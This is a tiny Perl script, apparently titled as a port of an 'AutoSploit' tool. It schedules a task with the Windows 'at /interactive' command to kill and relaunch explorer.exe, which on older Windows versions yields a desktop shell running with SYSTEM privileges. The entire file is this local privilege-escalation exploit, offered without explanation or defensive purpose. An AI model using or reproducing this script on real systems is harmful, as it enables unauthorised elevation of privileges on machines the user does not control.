# AutoSploit Perl port
# Matthew Jack
# 1/12/2012

($sec, $min,$hour) = localtime(time);
$min++;
$cmd = "at $hour:$min /interactive cmd /a /k \"taskkill /f /im explorer* && explorer.exe\"";
system($cmd);
system("pause");
